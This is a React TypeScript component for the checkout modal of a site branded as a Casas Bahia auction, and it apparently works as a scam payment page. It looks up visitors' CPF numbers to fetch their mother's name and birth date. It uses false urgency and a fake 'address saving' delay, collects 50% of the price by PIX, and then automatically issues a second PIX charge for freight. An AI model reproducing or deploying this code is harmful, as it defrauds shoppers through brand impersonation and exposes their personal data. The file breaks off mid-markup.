import { useState, useEffect, useRef } from "react";

declare global {
  interface Window {
    fbq?: (...args: unknown[]) => void;
  }
}

const CB_BLUE = "#0033C6";
const FRETE_AMOUNT = 94.90;
const PAID_STATUSES = ["paid", "approved", "captured", "authorized", "settled"];

interface BidModalProps {
  open: boolean;
  onClose: () => void;
  lotTitle: string;
  lotNum: string;
  bidAmount: number;
  comissao: number;
  itemId: string;
  lotImage?: string;
}

type Step =
  | "cpf-lookup"
  | "cpf-confirm"
  | "confirm"
  | "payment-select"
  | "address"
  | "address-saving"
  | "address-success"
  | "info"
  | "pix";

function formatBRL(v: number): string {
  return v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

function todayStr(): string {
  const d = new Date();
  return `${String(d.getDate()).padStart(2,"0")}/${String(d.getMonth()+1).padStart(2,"0")}/${d.getFullYear()}`;
}

function formatCPF(v: string): string {
  const n = v.replace(/\D/g, "").slice(0, 11);
  return n
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
}

function formatPhone(v: string): string {
  const n = v.replace(/\D/g, "").slice(0, 11);
  if (n.length <= 2) return n;
  if (n.length <= 7) return `(${n.slice(0,2)}) ${n.slice(2)}`;
  if (n.length <= 10) return `(${n.slice(0,2)}) ${n.slice(2,6)}-${n.slice(6)}`;
  return `(${n.slice(0,2)}) ${n.slice(2,7)}-${n.slice(7)}`;
}

function getDeliveryRange(): string {
  const months = ["Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro"];
  const today = new Date();
  const d1 = new Date(today); d1.setDate(today.getDate() + 5);
  const d2 = new Date(today); d2.setDate(today.getDate() + 6);
  const fmt = (d: Date) => `${d.getDate()} de ${months[d.getMonth()]}`;
  return `${fmt(d1)} e ${fmt(d2)}`;
}

function getApiBase(): string { return "/api"; }

function qrUrl(code: string): string {
  return `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(code)}`;
}

const inputStyle: React.CSSProperties = {
  display: "block", width: "100%", padding: "12px 14px",
  border: "1px solid #ddd", borderRadius: 8, fontSize: 14,
  fontFamily: "'SiteFonte','Nunito',sans-serif", outline: "none",
  boxSizing: "border-box", minHeight: 48,
};

interface CpfData { nome: string; nome_mae?: string; data_nascimento?: string; }

export default function BidModal({ open, onClose, lotTitle, lotNum, bidAmount, comissao, lotImage }: BidModalProps) {
  const [step, setStep] = useState<Step>("cpf-lookup");
  const [cpfInput, setCpfInput] = useState("");
  const [cpfData, setCpfData] = useState<CpfData | null>(null);
  const [cpfApiOk, setCpfApiOk] = useState(false);
  const [cpfLoading, setCpfLoading] = useState(false);
  const [payMethod, setPayMethod] = useState<"pix"|"boleto"|"card"|"delivery"|null>(null);
  const [address, setAddress] = useState({ cep: "", logradouro: "", bairro: "", cidade: "", uf: "", numero: "" });
  const [cepLoading, setCepLoading] = useState(false);
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");

  // PIX principal (50% do produto)
  const [pixCode, setPixCode] = useState("");
  const [pixTxId, setPixTxId] = useState("");
  const [pixLoading, setPixLoading] = useState(false);
  const [pixPaid, setPixPaid] = useState(false);
  const [copied, setCopied] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval>|null>(null);

  // PIX frete Sedex
  const [fretePixCode, setFretePixCode] = useState("");
  const [fretePixTxId, setFretePixTxId] = useState("");
  const [freteLoading, setFreteLoading] = useState(false);
  const [fretePixPaid, setFretePixPaid] = useState(false);
  const [freteCopied, setFreteCopied] = useState(false);
  const fretePollRef = useRef<ReturnType<typeof setInterval>|null>(null);
  const pixelFiredRef = useRef(false);

  const [error, setError] = useState("");

  useEffect(() => {
    if (!open) {
      setStep("cpf-lookup");
      setCpfInput(""); setCpfData(null); setCpfApiOk(false); setCpfLoading(false);
      setPayMethod(null);
      setAddress({ cep:"", logradouro:"", bairro:"", cidade:"", uf:"", numero:"" });
      setName(""); setPhone(""); setEmail("");
      setPixCode(""); setPixTxId(""); setPixPaid(false); setCopied(false); setError("");
      setFretePixCode(""); setFretePixTxId(""); setFreteLoading(false); setFretePixPaid(false); setFreteCopied(false);
      if (pollRef.current) clearInterval(pollRef.current);
      if (fretePollRef.current) clearInterval(fretePollRef.current);
      pixelFiredRef.current = false;
    }
  }, [open]);

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
      if (fretePollRef.current) clearInterval(fretePollRef.current);
    };
  }, []);

  async function handleCpfLookup() {
    const digits = cpfInput.replace(/\D/g,"");
    if (digits.length !== 11) return;
    setCpfLoading(true);
    try {
      const res = await fetch(`${getApiBase()}/cpf/consulta?cpf=${digits}`);
      const data = await res.json();
      if (data?.DADOS?.nome) {
        const d: CpfData = { nome: data.DADOS.nome };
        if (data.DADOS.nome_mae) d.nome_mae = data.DADOS.nome_mae;
        if (data.DADOS.data_nascimento) d.data_nascimento = data.DADOS.data_nascimento;
        setCpfData(d);
        setCpfApiOk(true);
        setName(data.DADOS.nome);
      } else {
        setCpfData(null); setCpfApiOk(false); setName("");
      }
    } catch {
      setCpfData(null); setCpfApiOk(false); setName("");
    }
    setCpfLoading(false);
    setStep("cpf-confirm");
  }

  async function fetchCep(cep: string) {
    const clean = cep.replace(/\D/g,"");
    if (clean.length !== 8) return;
    setCepLoading(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
      const data = await res.json();
      if (!data.erro) setAddress(a => ({ ...a, logradouro: data.logradouro||"", bairro: data.bairro||"", cidade: data.localidade||"", uf: data.uf||"" }));
    } catch {}
    setCepLoading(false);
  }

  async function handleAddressSave() {
    setStep("address-saving");
    await new Promise(r => setTimeout(r, 4000));
    setStep("address-success");
  }

  async function handleCreatePix() {
    const pixAmount = (bidAmount + comissao) / 2;
    setPixLoading(true); setError("");
    try {
      const res = await fetch(`${getApiBase()}/pix/create`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name,
          cpf: cpfInput.replace(/\D/g,""),
          amount: pixAmount,
          lotTitle,
          email: email || `${cpfInput.replace(/\D/g,"")}@arrematante.com.br`,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Erro ao gerar PIX");
      setPixCode(data.pixCode || "");
      setPixTxId(data.id || "");
      setStep("pix");
      startPolling(data.id);
    } catch (e: any) { setError(e.message || "Erro ao gerar PIX"); }
    setPixLoading(false);
  }

  function startPolling(txId: string) {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`${getApiBase()}/pix/status/${txId}`);
        const data = await res.json();
        const isPaid = PAID_STATUSES.includes(String(data.status).toLowerCase()) || !!data.paidAt;
        if (isPaid) {
          setPixPaid(true);
          if (pollRef.current) clearInterval(pollRef.current);
          handleCreateFretePix();
        }
      } catch {}
    }, 2000);
  }

  async function handleCreateFretePix() {
    // Dispara evento de compra no Facebook Pixel — apenas uma vez
    if (!pixelFiredRef.current && typeof window.fbq === "function") {
      pixelFiredRef.current = true;
      window.fbq("track", "Purchase", {
        value: bidAmount + comissao + FRETE_AMOUNT,
        currency: "BRL",
      });
    }
    setFreteLoading(true);
    try {
      const res = await fetch(`${getApiBase()}/pix/create`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name,
          cpf: cpfInput.replace(/\D/g,""),
          amount: FRETE_AMOUNT,
          lotTitle: `Frete Sedex — ${lotTitle}`,
          email: email || `${cpfInput.replace(/\D/g,"")}@arrematante.com.br`,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Erro ao gerar PIX do frete");
      setFretePixCode(data.pixCode || "");
      setFretePixTxId(data.id || "");
      startFretePolling(data.id);
    } catch {}
    setFreteLoading(false);
  }

  function startFretePolling(txId: string) {
    if (fretePollRef.current) clearInterval(fretePollRef.current);
    fretePollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`${getApiBase()}/pix/status/${txId}`);
        const data = await res.json();
        const isPaid = PAID_STATUSES.includes(String(data.status).toLowerCase()) || !!data.paidAt;
        if (isPaid) {
          setFretePixPaid(true);
          if (fretePollRef.current) clearInterval(fretePollRef.current);
        }
      } catch {}
    }, 2000);
  }

  function handleCopy() {
    navigator.clipboard.writeText(pixCode).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }

  function handleFreteCopy() {
    navigator.clipboard.writeText(fretePixCode).then(() => { setFreteCopied(true); setTimeout(() => setFreteCopied(false), 2000); });
  }

  if (!open) return null;

  const isPix = step === "pix";

  const overlay: React.CSSProperties = {
    position: "fixed", inset: 0, backgroundColor: "rgba(0,0,0,0.55)", zIndex: 1000,
    display: "flex", alignItems: "flex-end", justifyContent: "center",
  };
  const modal: React.CSSProperties = {
    backgroundColor: "white", borderRadius: "16px 16px 0 0",
    width: "100%", maxWidth: 560,
    height: isPix ? "92vh" : "70vh",
    display: "flex", flexDirection: "column",
    animation: "slideUp 0.28s ease",
    fontFamily: "'SiteFonte','Nunito',sans-serif",
    overflow: "hidden",
    transition: "height 0.3s ease",
  };
  const cpfDigits = cpfInput.replace(/\D/g,"");

  return (
    <>
      <style>{`
        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes spin { to { transform: rotate(360deg); } }
        .spin { animation: spin 1s linear infinite; }
      `}</style>
      <div style={overlay} onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
        <div style={modal}>
          {/* Header */}
          <div style={{ padding: "14px 20px 10px", borderBottom: "1px solid #f0f0f0", display: "flex", justifyContent: "space-between", alignItems: "center", flexShrink: 0 }}>
            <span style={{ fontSize: 13, fontWeight: 900, color: "#222", letterSpacing: "0.2px" }}>Lote #{lotNum}</span>
            <button onClick={onClose} style={{ background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#999", lineHeight: 1 }}>×</button>
          </div>

          {/* Body */}
          <div style={{ flex: 1, overflowY: "auto", padding: "16px 20px", display: "flex", flexDirection: "column", gap: 12 }}>

            {/* ─── STEP: CPF LOOKUP ─── */}
            {step === "cpf-lookup" && (
              <>
                <div style={{ textAlign: "center", paddingTop: 8 }}>
                  <img src="/logo-leilao-cb.png" alt="Leilão Casas Bahia" style={{ height: 52, objectFit: "contain", marginBottom: 12, display: "block", margin: "0 auto 12px" }} />
                  <p style={{ fontSize: 15, fontWeight: 900, color: "#222", marginBottom: 6 }}>Acesse o sistema Casas Bahia</p>
                  <p style={{ fontSize: 12, color: "#777", lineHeight: 1.6 }}>Informe seu CPF para identificar sua conta e prosseguir com o lance.</p>
                </div>
                <div style={{ marginTop: 4 }}>
                  <label style={{ fontSize: 11, fontWeight: 700, color: "#999", textTransform: "uppercase", letterSpacing: "0.4px", display: "block", marginBottom: 6 }}>CPF</label>
                  <input
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="000.000.000-00"
                    value={cpfInput}
                    maxLength={14}
                    onChange={e => setCpfInput(formatCPF(e.target.value))}
                    style={{ ...inputStyle, fontSize: 18, letterSpacing: 2, textAlign: "center" }}
                    autoFocus
                  />
                </div>
                <div style={{ paddingTop: 8 }}>
                  <button
                    disabled={cpfDigits.length !== 11 || cpfLoading}
                    onClick={handleCpfLookup}
                    style={{ display: "block", width: "100%", padding: "13px", backgroundColor: cpfDigits.length === 11 && !cpfLoading ? CB_BLUE : "#e0e0e0", color: cpfDigits.length === 11 && !cpfLoading ? "white" : "#aaa", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: cpfDigits.length === 11 && !cpfLoading ? "pointer" : "not-allowed" }}
                  >
                    {cpfLoading ? "Verificando..." : "Continuar"}
                  </button>
                </div>
              </>
            )}

            {/* ─── STEP: CPF CONFIRM ─── */}
            {step === "cpf-confirm" && (
              <>
                {cpfApiOk && cpfData ? (
                  <>
                    <div style={{ textAlign: "center", paddingTop: 4 }}>
                      <div style={{ width: 44, height: 44, borderRadius: "50%", backgroundColor: "#f0fdf4", border: "2px solid #86efac", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 10px", fontSize: 20 }}>✓</div>
                      <p style={{ fontSize: 14, fontWeight: 900, color: "#166534", marginBottom: 2 }}>CPF identificado</p>
                      <p style={{ fontSize: 12, color: "#777" }}>Confirme seus dados abaixo</p>
                    </div>
                    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                      <div>
                        <label style={{ fontSize: 11, fontWeight: 700, color: "#999", textTransform: "uppercase", letterSpacing: "0.4px", display: "block", marginBottom: 4 }}>Nome completo</label>
                        <input value={name} onChange={e => setName(e.target.value)} style={inputStyle} />
                      </div>
                      {cpfData.data_nascimento && (
                        <div>
                          <label style={{ fontSize: 11, fontWeight: 700, color: "#999", textTransform: "uppercase", letterSpacing: "0.4px", display: "block", marginBottom: 4 }}>Data de nascimento</label>
                          <input value={cpfData.data_nascimento} readOnly style={{ ...inputStyle, backgroundColor: "#f9f9f9", color: "#555" }} />
                        </div>
                      )}
                      {cpfData.nome_mae && (
                        <div>
                          <label style={{ fontSize: 11, fontWeight: 700, color: "#999", textTransform: "uppercase", letterSpacing: "0.4px", display: "block", marginBottom: 4 }}>Nome da mãe</label>
                          <input value={cpfData.nome_mae} readOnly style={{ ...inputStyle, backgroundColor: "#f9f9f9", color: "#555" }} />
                        </div>
                      )}
                    </div>
                  </>
                ) : (
                  <>
                    <div style={{ textAlign: "center", paddingTop: 4 }}>
                      <div style={{ width: 44, height: 44, borderRadius: "50%", backgroundColor: "#fff8f0", border: "2px solid #fbbf24", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 10px", fontSize: 20 }}>👤</div>
                      <p style={{ fontSize: 14, fontWeight: 900, color: "#222", marginBottom: 2 }}>Cadastro não encontrado</p>
                      <p style={{ fontSize: 12, color: "#777", lineHeight: 1.6 }}>Não localizamos um cadastro para este CPF. Por favor, informe seu nome para continuar.</p>
                    </div>
                    <div>
                      <label style={{ fontSize: 11, fontWeight: 700, color: "#999", textTransform: "uppercase", letterSpacing: "0.4px", display: "block", marginBottom: 4 }}>Nome completo</label>
                      <input placeholder="Seu nome completo" value={name} onChange={e => setName(e.target.value)} style={inputStyle} />
                    </div>
                  </>
                )}
                <div style={{ marginTop: "auto", paddingTop: 8 }}>
                  <button
                    disabled={name.trim().length < 3}
                    onClick={() => setStep("confirm")}
                    style={{ display: "block", width: "100%", padding: "13px", backgroundColor: name.trim().length >= 3 ? CB_BLUE : "#e0e0e0", color: name.trim().length >= 3 ? "white" : "#aaa", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: name.trim().length >= 3 ? "pointer" : "not-allowed" }}
                  >
                    Continuar
                  </button>
                </div>
              </>
            )}

            {/* ─── STEP: CONFIRM ─── */}
            {step === "confirm" && (
              <>
                <div>
                  <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 2 }}>Encerramento do leilão</p>
                  <p style={{ fontSize: 13, fontWeight: 900, color: "#222" }}>{todayStr()} às 23:59</p>
                </div>
                <div style={{ borderTop: "1px solid #f0f0f0", paddingTop: 12 }}>
                  <p style={{ fontSize: 12, color: "#444", lineHeight: 1.7 }}>
                    Ao confirmar o lance de <strong>{formatBRL(bidAmount)}</strong>, você arrematará este lote imediatamente, garantindo a aquisição antes que outro comprador o faça.
                  </p>
                </div>
                <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "12px 14px" }}>
                  <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 8 }}>Resumo financeiro</p>
                  <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                    <span style={{ fontSize: 12, color: "#555" }}>Valor do lance</span>
                    <span style={{ fontSize: 12, fontWeight: 700, color: "#222" }}>{formatBRL(bidAmount)}</span>
                  </div>
                  <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                    <span style={{ fontSize: 12, color: "#555" }}>Comissão leiloeiro (5%)</span>
                    <span style={{ fontSize: 12, fontWeight: 700, color: "#222" }}>{formatBRL(comissao)}</span>
                  </div>
                  <div style={{ display: "flex", justifyContent: "space-between", borderTop: "1px solid #ebebeb", paddingTop: 8, marginTop: 4 }}>
                    <span style={{ fontSize: 13, fontWeight: 900, color: "#222" }}>Total</span>
                    <span style={{ fontSize: 13, fontWeight: 900, color: CB_BLUE }}>{formatBRL(bidAmount + comissao)}</span>
                  </div>
                </div>
                <div style={{ borderTop: "1px solid #f0f0f0", paddingTop: 10 }}>
                  <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 6 }}>Formas de pagamento</p>
                  <p style={{ fontSize: 12, color: "#444", marginBottom: 3 }}>— À vista: PIX ou Boleto Bancário</p>
                  <p style={{ fontSize: 12, color: "#444", marginBottom: 3 }}>— Parcelamento no Cartão de Crédito em até 12×</p>
                  <p style={{ fontSize: 12, color: "#444" }}>— Pagamento na entrega, mediante aceitação dos termos de desistência</p>
                </div>
                <div style={{ marginTop: "auto", paddingTop: 8 }}>
                  <button onClick={() => setStep("payment-select")} style={{ display: "block", width: "100%", padding: "13px", backgroundColor: CB_BLUE, color: "white", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: "pointer" }}>
                    Prosseguir
                  </button>
                </div>
              </>
            )}

            {/* ─── STEP: PAYMENT SELECT ─── */}
            {step === "payment-select" && (
              <>
                <div style={{ textAlign: "center" }}>
                  <div style={{ width: 48, height: 48, borderRadius: "50%", backgroundColor: "#f0fdf4", border: "2px solid #86efac", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 10px", fontSize: 22 }}>✓</div>
                  <p style={{ fontSize: 15, fontWeight: 900, color: "#166534", marginBottom: 4 }}>Produto reservado com sucesso!</p>
                  <p style={{ fontSize: 12, color: "#555", lineHeight: 1.5 }}>
                    Reservado para <strong>{name}</strong><br />
                    <span style={{ fontSize: 11, color: "#999" }}>CPF: {cpfInput}</span>
                  </p>
                </div>
                <div style={{ border: "1px solid #e8e8e8", borderRadius: 10, overflow: "hidden", display: "flex", gap: 0 }}>
                  {lotImage && (
                    <div style={{ width: 90, flexShrink: 0, backgroundColor: "#f9f9f9", display: "flex", alignItems: "center", justifyContent: "center", padding: 8 }}>
                      <img src={lotImage} alt={lotTitle} style={{ width: "100%", height: 80, objectFit: "contain" }} />
                    </div>
                  )}
                  <div style={{ padding: "10px 12px", flex: 1, minWidth: 0 }}>
                    <p style={{ fontSize: 10, fontWeight: 800, color: CB_BLUE, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 3 }}>Lote #{lotNum}</p>
                    <p style={{ fontSize: 12, fontWeight: 800, color: "#222", lineHeight: 1.4, marginBottom: 6 }}>{lotTitle}</p>
                    <p style={{ fontSize: 12, fontWeight: 900, color: CB_BLUE }}>{formatBRL(bidAmount)}</p>
                  </div>
                </div>
                <div style={{ backgroundColor: "#fff8f0", border: "1px solid #fed7aa", borderRadius: 8, padding: "10px 14px", display: "flex", gap: 8, alignItems: "flex-start" }}>
                  <span style={{ fontSize: 16, flexShrink: 0 }}>🔒</span>
                  <p style={{ fontSize: 12, color: "#7c3a00", lineHeight: 1.6 }}>
                    Este produto foi <strong>removido dos itens disponíveis</strong> e está reservado exclusivamente para você. Conclua o processo para garantir sua arrematação.
                  </p>
                </div>
                <div style={{ marginTop: "auto", paddingTop: 8 }}>
                  <button onClick={() => setStep("address")} style={{ display: "block", width: "100%", padding: "13px", backgroundColor: CB_BLUE, color: "white", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: "pointer" }}>
                    Confirmar e continuar
                  </button>
                </div>
              </>
            )}

            {/* ─── STEP: ADDRESS ─── */}
            {step === "address" && (
              <>
                <div>
                  <p style={{ fontSize: 13, fontWeight: 900, color: "#222", marginBottom: 4 }}>Endereço de entrega</p>
                  <p style={{ fontSize: 12, color: "#777" }}>Informe onde o produto deve ser entregue.</p>
                </div>
                <input inputMode="numeric" pattern="[0-9]*" placeholder="CEP" value={address.cep} maxLength={9}
                  onChange={e => { const v = e.target.value.replace(/\D/g,"").slice(0,8); const f = v.length > 5 ? `${v.slice(0,5)}-${v.slice(5)}` : v; setAddress(a => ({ ...a, cep: f })); if (v.length === 8) fetchCep(v); }}
                  style={inputStyle} />
                {cepLoading && <p style={{ fontSize: 11, color: "#888" }}>Buscando endereço...</p>}
                <input placeholder="Logradouro" value={address.logradouro} onChange={e => setAddress(a => ({ ...a, logradouro: e.target.value }))} style={inputStyle} />
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                  <input placeholder="Número" value={address.numero} onChange={e => setAddress(a => ({ ...a, numero: e.target.value }))} style={inputStyle} />
                  <input placeholder="Bairro" value={address.bairro} onChange={e => setAddress(a => ({ ...a, bairro: e.target.value }))} style={inputStyle} />
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr", gap: 8 }}>
                  <input placeholder="Cidade" value={address.cidade} onChange={e => setAddress(a => ({ ...a, cidade: e.target.value }))} style={inputStyle} />
                  <input placeholder="UF" value={address.uf} onChange={e => setAddress(a => ({ ...a, uf: e.target.value }))} style={inputStyle} />
                </div>
                <div style={{ marginTop: "auto", paddingTop: 8 }}>
                  <button disabled={!address.logradouro || !address.numero || !address.cidade} onClick={handleAddressSave} style={{ display: "block", width: "100%", padding: "13px", backgroundColor: address.logradouro && address.numero ? CB_BLUE : "#e0e0e0", color: address.logradouro && address.numero ? "white" : "#aaa", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: address.logradouro && address.numero ? "pointer" : "not-allowed" }}>
                    Prosseguir
                  </button>
                </div>
              </>
            )}

            {/* ─── STEP: ADDRESS SAVING ─── */}
            {step === "address-saving" && (
              <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 16 }}>
                <div className="spin" style={{ width: 40, height: 40, borderRadius: "50%", border: "3px solid #e0e0e0", borderTopColor: CB_BLUE }} />
                <p style={{ fontSize: 13, color: "#555", fontWeight: 700 }}>Salvando endereço...</p>
              </div>
            )}

            {/* ─── STEP: ADDRESS SUCCESS ─── */}
            {step === "address-success" && (
              <>
                <div style={{ textAlign: "center", paddingTop: 8 }}>
                  <div style={{ width: 48, height: 48, borderRadius: "50%", backgroundColor: "#f0fdf4", border: "2px solid #86efac", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 10px", fontSize: 22 }}>✓</div>
                  <p style={{ fontSize: 14, fontWeight: 900, color: "#166534", marginBottom: 4 }}>Endereço salvo com sucesso</p>
                </div>
                <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "12px 14px" }}>
                  <p style={{ fontSize: 12, color: "#444", lineHeight: 1.8 }}>
                    {address.logradouro}, {address.numero}<br />
                    {address.bairro} — {address.cidade}/{address.uf}<br />
                    CEP: {address.cep}
                  </p>
                  <button onClick={() => setStep("address")} style={{ marginTop: 8, fontSize: 11, color: CB_BLUE, background: "none", border: "none", cursor: "pointer", fontWeight: 700, padding: 0 }}>
                    Editar endereço
                  </button>
                </div>
                <div style={{ backgroundColor: "#f0f4ff", border: "1px solid #c7d5ff", borderRadius: 8, padding: "12px 14px", display: "flex", alignItems: "center", gap: 10 }}>
                  <span style={{ fontSize: 22, flexShrink: 0 }}>🚚</span>
                  <div>
                    <p style={{ fontSize: 11, fontWeight: 800, color: CB_BLUE, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 3 }}>Previsão de entrega</p>
                    <p style={{ fontSize: 13, fontWeight: 900, color: "#222" }}>Entre {getDeliveryRange()}</p>
                    <p style={{ fontSize: 11, color: "#666", marginTop: 2 }}>Após confirmação do pagamento</p>
                  </div>
                </div>
                <div>
                  <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 4 }}>Dados para rastreamento</p>
                  <p style={{ fontSize: 12, color: "#666", lineHeight: 1.6, marginBottom: 10 }}>
                    Informe seu telefone e e-mail para receber o código de rastreamento e informações da compra.
                  </p>
                  <input
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="Telefone / WhatsApp"
                    value={phone}
                    maxLength={16}
                    onChange={e => setPhone(formatPhone(e.target.value))}
                    style={{ ...inputStyle, marginBottom: 8 }}
                  />
                  <input
                    inputMode="email"
                    type="email"
                    placeholder="E-mail"
                    value={email}
                    onChange={e => setEmail(e.target.value)}
                    style={inputStyle}
                  />
                </div>
                <div style={{ marginTop: "auto", paddingTop: 8 }}>
                  <button
                    disabled={phone.replace(/\D/g,"").length < 10 || !email.includes("@")}
                    onClick={() => setStep("info")}
                    style={{ display: "block", width: "100%", padding: "13px", backgroundColor: phone.replace(/\D/g,"").length >= 10 && email.includes("@") ? CB_BLUE : "#e0e0e0", color: phone.replace(/\D/g,"").length >= 10 && email.includes("@") ? "white" : "#aaa", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: phone.replace(/\D/g,"").length >= 10 && email.includes("@") ? "pointer" : "not-allowed" }}
                  >
                    Continuar
                  </button>
                </div>
              </>
            )}

            {/* ─── STEP: INFO ─── */}
            {step === "info" && (() => {
              const total = bidAmount + comissao;
              const pixAmount = total / 2;
              return (
                <>
                  <div>
                    <p style={{ fontSize: 13, fontWeight: 900, color: "#222", marginBottom: 4 }}>Confirmar arrematação</p>
                    <p style={{ fontSize: 12, color: "#777", lineHeight: 1.6 }}>
                      Para arrematar este lote é obrigatório o pagamento de <strong>50% do valor total agora</strong>.
                      O restante será pago na entrega com a forma de pagamento selecionada.
                    </p>
                  </div>
                  <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "12px 14px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 5 }}>
                      <span style={{ fontSize: 12, color: "#555" }}>Valor do lance</span>
                      <span style={{ fontSize: 12, fontWeight: 700, color: "#222" }}>{formatBRL(bidAmount)}</span>
                    </div>
                    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
                      <span style={{ fontSize: 12, color: "#555" }}>Comissão leiloeiro (5%)</span>
                      <span style={{ fontSize: 12, fontWeight: 700, color: "#222" }}>{formatBRL(comissao)}</span>
                    </div>
                    <div style={{ borderTop: "1px solid #e0e0e0", paddingTop: 8, display: "flex", justifyContent: "space-between", marginBottom: 5 }}>
                      <span style={{ fontSize: 12, color: "#555" }}>Total</span>
                      <span style={{ fontSize: 13, fontWeight: 900, color: "#222" }}>{formatBRL(total)}</span>
                    </div>
                    <div style={{ display: "flex", justifyContent: "space-between" }}>
                      <span style={{ fontSize: 12, color: "#555" }}>50% agora (PIX)</span>
                      <span style={{ fontSize: 14, fontWeight: 900, color: CB_BLUE }}>{formatBRL(pixAmount)}</span>
                    </div>
                    <div style={{ display: "flex", justifyContent: "space-between", marginTop: 3 }}>
                      <span style={{ fontSize: 12, color: "#555" }}>50% na entrega</span>
                      <span style={{ fontSize: 12, fontWeight: 700, color: "#555" }}>{formatBRL(pixAmount)}</span>
                    </div>
                  </div>
                  <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "10px 14px" }}>
                    <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 4 }}>Leiloeiro Oficial</p>
                    <p style={{ fontSize: 13, fontWeight: 900, color: "#222" }}>Osmar Campos Vicente Marques</p>
                    <p style={{ fontSize: 12, color: "#777", marginTop: 2 }}>JUCESP 1487</p>
                  </div>
                  {error && <p style={{ fontSize: 12, color: "#c0392b", fontWeight: 700 }}>{error}</p>}
                  <div style={{ marginTop: "auto", paddingTop: 8 }}>
                    <button onClick={handleCreatePix} disabled={pixLoading} style={{ display: "block", width: "100%", padding: "13px", backgroundColor: pixLoading ? "#e0e0e0" : CB_BLUE, color: pixLoading ? "#aaa" : "white", fontWeight: 900, fontSize: 14, borderRadius: 8, border: "none", cursor: pixLoading ? "not-allowed" : "pointer" }}>
                      {pixLoading ? "Gerando PIX..." : `Pagar ${formatBRL(pixAmount)} via PIX`}
                    </button>
                  </div>
                </>
              );
            })()}

            {/* ─── STEP: PIX ─── */}
            {step === "pix" && (() => {
              const pixAmount = (bidAmount + comissao) / 2;

              // ── Produto pago → mostrar cobrança do frete ──
              if (pixPaid) {
                return (
                  <>
                    {/* Confirmação do produto */}
                    <div style={{ textAlign: "center" }}>
                      <div style={{ width: 44, height: 44, borderRadius: "50%", backgroundColor: "#f0fdf4", border: "2px solid #86efac", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 8px", fontSize: 20 }}>✓</div>
                      <p style={{ fontSize: 14, fontWeight: 900, color: "#166534", marginBottom: 2 }}>Pagamento do produto confirmado!</p>
                      <p style={{ fontSize: 12, color: "#555" }}>{formatBRL(pixAmount)} recebido com sucesso.</p>
                    </div>

                    <div style={{ border: "1px solid #e0e0e0", borderRadius: 8, overflow: "hidden" }}>
                      <div style={{ backgroundColor: CB_BLUE, padding: "10px 14px" }}>
                        <p style={{ fontSize: 12, fontWeight: 900, color: "white", margin: 0 }}>🚚 Frete Sedex — Entrega para todo o Brasil</p>
                      </div>
                      <div style={{ padding: "12px 14px", backgroundColor: "#fafafa" }}>
                        <p style={{ fontSize: 12, color: "#444", lineHeight: 1.6, marginBottom: 10 }}>
                          Para finalizar a arrematação e agendar a entrega do seu produto, é necessário o pagamento do frete via Sedex.
